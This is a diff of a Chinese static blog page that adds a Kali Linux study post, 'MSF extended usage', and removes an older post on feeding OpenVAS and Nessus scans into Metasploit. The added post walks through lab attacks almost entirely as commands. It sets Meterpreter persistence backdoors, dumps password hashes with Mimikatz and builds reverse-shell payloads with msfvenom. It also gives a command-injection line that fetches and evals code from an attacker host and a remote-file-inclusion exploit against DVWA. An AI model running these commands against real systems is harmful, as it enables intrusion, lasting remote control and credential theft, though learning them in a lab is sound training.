@@ -240,6 +240,464 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%8C)%EF%BC%9AMSF%E5%BB%B6%E5%B1%95%E7%94%A8%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%BA%8C)%EF%BC%9AMSF%E5%BB%B6%E5%B1%95%E7%94%A8%E6%B3%95/" itemprop="url">Kali Linux笔记(一百一十二)：MSF延展用法</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:42:32+08:00">
+                2020-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.5k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-MSF延展用法–Meterpreter后门"><a href="#1-MSF延展用法–Meterpreter后门" class="headerlink" title="1. MSF延展用法–Meterpreter后门"></a>1. MSF延展用法–Meterpreter后门</h4><ul>
+<li>持久后门<ul>
+<li>利用漏洞取得的meterpreter shell运行于内存，重启失效</li>
+<li>重复exploit漏洞可能造成服务崩溃</li>
+<li>持久后门保证漏洞修复后仍可远程控制</li>
+</ul>
+</li>
+<li>Meterpreter后门–metsvc<ul>
+<li>▲ metsvc不能改端口，不支持身份验证</li>
+<li><strong><code>🔺命令：run metsvc -h</code></strong> <ul>
+<li>-A：自动启动/exploit/multi/handle监听</li>
+<li>-r：删除监听</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong>  </li>
+<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong>  <ul>
+<li><strong><code>🔺命令：set LPORT 31337</code></strong>  </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set RHOST 1.1.1.1</code></strong> </li>
+</ul>
+</li>
+<li>Meterpreter后门–persistence<ul>
+<li>▲ 添加VBS脚本，并在注册表添加启动项</li>
+<li><strong><code>🔺命令：run persistence -h</code></strong> <ul>
+<li>默认使用windows/meterprter/reverse_tcp</li>
+<li>-X：自动启动agent当机器开机</li>
+<li>-r：要连接的IP</li>
+<li>-p：要连接的端口</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：run persistence -X -i 10 -p 4444 -r 1.1.1.1</code></strong>  </li>
+<li><strong><code>🔺命令：run persistence -U -i 20 -p 4444 -r 1.1.1.1</code></strong>  </li>
+<li><strong><code>🔺命令：run persistence -S -i 20 -p 4444 -r 1.1.1.1</code></strong> </li>
+</ul>
+</li>
+</ul>
+<h4 id="2-MSF延展用法–Mimikatz"><a href="#2-MSF延展用法–Mimikatz" class="headerlink" title="2. MSF延展用法–Mimikatz"></a>2. MSF延展用法–Mimikatz</h4><ul>
+<li>hashdump使用的就是Minikatz的部分功能<ul>
+<li><strong><code>🔺命令：getsystem</code></strong>  </li>
+<li><strong><code>🔺命令：load mimikatz</code></strong>  </li>
+<li>wdigest、kerberos、msv、ssp、tspkg、livessp<ul>
+<li>msv：账号加密信息</li>
+<li>ssp：账号不加密信息</li>
+<li>tspkg：kerveros身份票据信息</li>
+<li>wdigest：从内存中获取账号明文密码</li>
+<li>kerboros：从内存中获取账号明文密码</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：mimikatz_command -h</code></strong>  <ul>
+<li>-a：使用具体模块所需要的子参数</li>
+<li>-f：使用的模块</li>
+</ul>
+</li>
+<li>查看模块（使用不存在模块，报错显示）：<strong><code>🔺命令：mimikatz_command -f a::</code></strong>  </li>
+<li>查看系统账号哈希：<strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong></li>
+<li>查看操作系统进程：<strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
+<li>查看操作系统服务：<strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
+<li>查看操作系统支持的加密：<strong><code>🔺命令：mimikatz_command -fcrypto::listProviders</code></strong> </li>
+<li>查看地雷雷数：<strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong><ul>
+<li>▲ winmine：扫雷游戏</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-MSF延展用法–PHP-shel-Web-Delivery"><a href="#3-MSF延展用法–PHP-shel-Web-Delivery" class="headerlink" title="3. MSF延展用法–PHP shel/Web Delivery"></a>3. MSF延展用法–PHP shel/Web Delivery</h4><ul>
+<li>PHP shell<ul>
+<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</code></strong></li>
+<li>MSF启动侦听</li>
+<li>上传到web站点并通过浏览器访问<ul>
+<li>Web Delivery</li>
+<li>利用代码执行漏洞访问攻击者服务器，从攻击者服务器下载远程执行代码，执行下载的代码后反弹一个shell给攻击者的服务器</li>
+<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong> </li>
+<li><strong><code>🔺命令：set target 1</code></strong> </li>
+<li><strong><code>🔺命令：;php -d allow_url_fopen=true -r “eval(file_get_contents(‘http://1.1.1.1/ fTYWqmu&#39;));&quot;</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-MSF延展用法–RFI远程文件包含"><a href="#4-MSF延展用法–RFI远程文件包含" class="headerlink" title="4. MSF延展用法–RFI远程文件包含"></a>4. MSF延展用法–RFI远程文件包含</h4><ul>
+<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
+<li>allow_url_fopen = On </li>
+<li>allow_url_include = On </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> </li>
+<li><strong><code>🔺命令：set RHOST 1.1.1.2</code></strong> </li>
+<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
+<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
+<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
+<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong></li>
+<li><strong><code>🔺命令：set lhost 1.1.1.1 – exploit</code></strong></li>
+</ul>
+<h4 id="5-实验准备"><a href="#5-实验准备" class="headerlink" title="5. 实验准备"></a>5. 实验准备</h4><ul>
+<li>Kali<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=Window XP的IP LPORT=4444 -a x86 --platform windows -b &#39;\x00\xff&#39; -e x86/shikata_ga -f exe a.exe</code></strong></li>
+<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set exitonsession false</code></strong>（退出session继续监听）</li>
+<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：jobs</code></strong><ul>
+<li>查看job是否一直有任务</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
+<li>浏览器访问<a href="http://Kali的IP地址/a.exe，下载a.exe" target="_blank" rel="noopener">http://Kali的IP地址/a.exe，下载a.exe</a></li>
+<li>执行a.exe</li>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+</ul>
+</li>
+<li>Metasploit<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-实验–metsvc"><a href="#6-实验–metsvc" class="headerlink" title="6. 实验–metsvc"></a>6. 实验–metsvc</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：run metsvc -h</code></strong></li>
+<li><strong><code>🔺命令：run metsvc -A</code></strong>（31337）</li>
+<li>查看是否拿到shell</li>
+<li>在window 7的计算机管理查看是否开启服务meterpreter → metsvc</li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
+<li><strong><code>🔺命令：set PAYLOAD windows/metsvc_bind_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：set LPORT 31337</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set RHOST Window XP的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-实验–persistence"><a href="#7-实验–persistence" class="headerlink" title="7. 实验–persistence"></a>7. 实验–persistence</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：run persistence -h</code></strong></li>
+<li><strong><code>🔺命令：run persistence -X -p 4444 -r Window XP的IP</code></strong></li>
+<li><strong><code>🔺命令：background</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterprter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Window XP的IP</code></strong></li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong><ul>
+<li><strong><code>🔺命令：set exitonsession false</code></strong></li>
+<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>重新启动</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+</ul>
+</li>
+<li>▲ 2020.03.04 能够正常执行，但因为XP无法重新启动，所以最后的shell无法验证</li>
+</ul>
+<h4 id="8-实验–Mimikatz"><a href="#8-实验–Mimikatz" class="headerlink" title="8. 实验–Mimikatz"></a>8. 实验–Mimikatz</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：getsystem</code></strong></li>
+<li><strong><code>🔺命令：load mimikatz</code></strong> </li>
+<li><strong><code>🔺命令：mimikatz_command -h</code></strong> </li>
+<li><strong><code>🔺命令：mimikatz_command -f a::</code></strong> </li>
+<li><strong><code>🔺命令：mimikatz_command -f samdump::hashes</code></strong> </li>
+<li><strong><code>🔺命令：mimikatz_command -f handle::list</code></strong> </li>
+<li><strong><code>🔺命令：mimikatz_command -f service::list</code></strong> </li>
+<li><strong><code>🔺命令：mimikatz_command -f crypto::listProviders</code></strong> </li>
+<li><strong><code>🔺命令：mimikatz_command -f winmine::infos</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="9-实验–PHP-shell"><a href="#9-实验–PHP-shell" class="headerlink" title="9. 实验–PHP shell"></a>9. 实验–PHP shell</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfvenom -p php/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=3333 -f raw -o a.php</code></strong> </li>
+<li><strong><code>🔺命令：scp a.php msfadmin@Metasploit的IP:/home/msfadmin</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
+<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：set LPORT 3333</code></strong></li>
+<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Metasploit<ul>
+<li><strong><code>🔺命令：sudo cp a.php /var/www</code></strong></li>
+<li><strong><code>🔺命令：ls /var/www</code></strong>（查看是否已经复制）</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>浏览器访问<a href="http://Metasploit的IP/a.php" target="_blank" rel="noopener">http://Metasploit的IP/a.php</a></li>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="10-实验–Web-Delivery"><a href="#10-实验–Web-Delivery" class="headerlink" title="10. 实验–Web Delivery"></a>10. 实验–Web Delivery</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/multi/script/web_delivery</code></strong><ul>
+<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
+<li><strong><code>🔺命令：set target 1</code></strong>（PHP）</li>
+<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>浏览器访问<a href="http://Metasploit的IP，访问DVWA" target="_blank" rel="noopener">http://Metasploit的IP，访问DVWA</a></li>
+<li>设置安全级别为低</li>
+<li>在Cmomand Exection中执行生成的命令行<strong><code>🔺命令：;php -d allow url fopen=true -r &quot;eval(file get contents(&#39;http://Kali的IP:8080/&#39;));&quot;</code></strong></li>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="11-实验–RFI远程文件包含"><a href="#11-实验–RFI远程文件包含" class="headerlink" title="11. 实验–RFI远程文件包含"></a>11. 实验–RFI远程文件包含</h4><ul>
+<li>Kali<ul>
+<li>浏览器访问<a href="http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试" target="_blank" rel="noopener">http://Metasploit的IP/dvwa，把安全级别设置为低，本地文件包含测试</a></li>
+</ul>
+</li>
+<li>Metasploit<ul>
+<li><strong><code>🔺命令：vi /etc/php5/cgi/php.ini</code></strong><ul>
+<li>allow_url_fopen = On </li>
+<li>allow_url_include = On</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：sudo /etc/init.d apache2 restart</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>浏览器访问<a href="http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php" target="_blank" rel="noopener">http://Metasploit的IP/dvwa/?page=http://www.163.com/index.php</a> ，远程文件包含测试</li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/unix/webapp/php_include</code></strong> <ul>
+<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong> </li>
+<li><strong><code>🔺命令：set PATH /dvwa/vulnerabilities/fi/</code></strong> </li>
+<li><strong><code>🔺命令：set PHPURI /?page=XXpathXX</code></strong> </li>
+<li><strong><code>🔺命令：set HEADERS &quot;Cookie:security=low; PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;</code></strong> </li>
+<li><strong><code>🔺命令：set payload php/meterpreter/reverse_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：set lhost Kali的IP</code></strong> </li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>查看是否能直接拿到shell</li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li>▲ 2020.03.04 Exploit completed,but no session was created</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Post/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3540,222 +3998,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%9B%9B)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--%E7%BB%93%E5%90%88%E5%A4%96%E9%83%A8%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%9B%9B)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--%E7%BB%93%E5%90%88%E5%A4%96%E9%83%A8%E5%BA%94%E7%94%A8/" itemprop="url">Kali Linux笔记(一百零四)：MSF模块--结合外部应用</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-02T14:41:21+08:00">
-                2020-03-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  208 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Msf–弱点扫描"><a href="#1-Msf–弱点扫描" class="headerlink" title="1. Msf–弱点扫描"></a>1. Msf–弱点扫描</h4><ul>
-<li>Openvas<ul>
-<li><strong><code>🔺命令：Load openvas</code></strong><ul>
-<li>命令行模式，需要配置，使用繁琐</li>
-</ul>
-</li>
-<li>导入nbe格式扫描日志</li>
-<li><strong><code>🔺命令：db_import openvas.nbe</code></strong></li>
-</ul>
-</li>
-<li>Nessus</li>
-<li>Nexpose<ul>
-<li>xml格式日志文件</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-实验（Openvas-→-Metasploit）"><a href="#2-实验（Openvas-→-Metasploit）" class="headerlink" title="2. 实验（Openvas → Metasploit）"></a>2. 实验（Openvas → Metasploit）</h4><ul>
-<li>开启Openvas，网页模式进行Quick start漏洞扫描，导出nbe日志格式</li>
-<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
-<li><strong><code>🔺命令：Load openvas</code></strong></li>
-<li><strong><code>🔺命令：db_import openvas.nbe</code></strong></li>
-<li><strong><code>🔺命令：hosts</code></strong></li>
-<li><strong><code>🔺命令：services</code></strong></li>
-<li><strong><code>🔺命令：vulns</code></strong></li>
-</ul>
-<h4 id="3-实验（Nessuse-→-Metasploit）"><a href="#3-实验（Nessuse-→-Metasploit）" class="headerlink" title="3. 实验（Nessuse → Metasploit）"></a>3. 实验（Nessuse → Metasploit）</h4><ul>
-<li><strong><code>🔺命令：cd /etc/init.d</code></strong></li>
-<li><strong><code>🔺命令：./nessusd start</code></strong></li>
-<li>网页查询是否已经正常启动</li>
-<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
-<li><strong><code>🔺命令：Load nessus</code></strong> </li>
-<li>扫描帮助：<strong><code>🔺命令：nessus_help</code></strong> </li>
-<li>扫描连接：<strong><code>🔺命令：nessus_connect admin:toor@127.0.0.1</code></strong></li>
-<li>扫描策略：<strong><code>🔺命令：nessus_policy_list</code></strong>（若无策略，则需网页建立一个新的策略）</li>
-<li>扫描任务：<strong><code>🔺命令：nessus_scan_new &lt;UUID&gt; &lt;Name&gt; &lt;Description&gt; &lt;Target&gt;</code></strong></li>
-<li>执行扫描任务：<strong><code>🔺命令：nessus_scan_launch &lt;ID&gt;</code></strong> </li>
-<li><strong><code>🔺命令：nessus_report_list</code></strong></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/5/">Next</a>
+    <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/5/">Next</a>
   </nav>
 
 
@@ -3805,7 +4052,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-count">161</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3912,7 +4159,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">147k</span>
+    <span title="Site words total count">147.5k</span>
   
 </div>
 
